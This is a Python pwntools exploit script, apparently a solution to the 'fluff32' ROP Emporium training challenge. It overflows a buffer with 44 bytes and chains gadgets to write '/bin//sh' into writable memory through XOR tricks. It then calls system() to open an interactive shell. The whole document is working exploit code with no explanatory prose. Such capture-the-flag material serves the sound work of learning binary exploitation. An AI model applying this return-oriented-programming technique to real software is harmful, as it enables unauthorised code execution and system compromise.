from pwn import *

context(arch='i386', os='linux')
binary_name = 'fluff32'
p = process('./'+binary_name)
elf =  ELF(binary_name)

system = elf.sym["system"] 
exit = 0x80484e8
log.info("System address (.plt): " + hex(system))

# .data start address
writable_memory        = 0x0804a028
# *0x080483e1: pop ebx; ret;* 
pop_ebx                = 0x080483e1
# *0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;*
xor_edxedx_pop_esi     = 0x08048671
# *0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;*
xor_edxebx_popebp      = 0x0804867b
# *0x08048689: xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;*
xchg_edxecx_popebp     = 0x08048689
# 0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
writewhatwhere         = 0x08048693
garbage = 0x6262

rop =  "A"*44
# EBX = <.data address>
rop += p32(pop_ebx) + p32(writable_memory)
# EDX = 0
rop += p32(xor_edxedx_pop_esi) + p32(garbage)
# EDX = EBX
rop += p32(xor_edxebx_popebp)  + p32(garbage)
# ECX = EDX = EBX = <.data address>
rop += p32(xchg_edxecx_popebp) + p32(garbage)

# EBX = "/bin"
rop += p32(pop_ebx) + "\x01at " #"/bin"
# EDX = 0
rop += p32(xor_edxedx_pop_esi) + p32(garbage)
# EDX = EBX = "/bin//sh"
rop += p32(xor_edxebx_popebp)  + p32(garbage)

# Write "/bin" in <.data address>
rop += p32(writewhatwhere) + p32(garbage) + p32(garbage)


# EBX = <.data address>
rop += p32(pop_ebx) + p32(writable_memory+4) # writable memory + 4
# EDX = 0
rop += p32(xor_edxedx_pop_esi) + p32(garbage)
# EDX = EBX
rop += p32(xor_edxebx_popebp)  + p32(garbage)
# ECX = EDX = EBX = <.data address>
rop += p32(xchg_edxecx_popebp) + p32(garbage)

# EBX = "//sh"
rop += p32(pop_ebx) + "\x04la*" #"//sh"
# EDX = 0
rop += p32(xor_edxedx_pop_esi) + p32(garbage)
# EDX = EBX = "/bin//sh"
rop += p32(xor_edxebx_popebp)  + p32(garbage)

# Write "//sh" in <.data address>
rop += p32(writewhatwhere) + p32(garbage) + p32(garbage)

rop += p32(system) + p32(exit) + p32(writable_memory)

p.recvuntil("> ")
p.send(rop)
p.interactive()